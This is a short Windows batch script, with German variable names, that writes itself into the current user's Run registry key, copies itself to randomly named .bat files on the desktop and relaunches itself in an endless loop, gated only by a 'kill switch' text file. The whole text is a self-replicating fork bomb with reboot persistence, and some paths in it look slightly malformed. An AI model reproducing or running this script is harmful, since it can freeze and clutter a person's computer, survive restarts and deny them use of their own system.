@echo off
set KillSwitch="C:\User\%USERNAME%\Desktop\kill_switch.txt"
if NOT exist %KillSwitch% goto end
set Dateipfad="C:\User\micha\Desktop\%Random%.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v %RANDOM% /t REG_SZ /d "%~f0" /f
copy "%~f0" %Dateipfad%
start %Dateipfad%
:loop
if NOT exist %KillSwitch% goto end
start "" "%~f0"
goto :loop
:end
exit
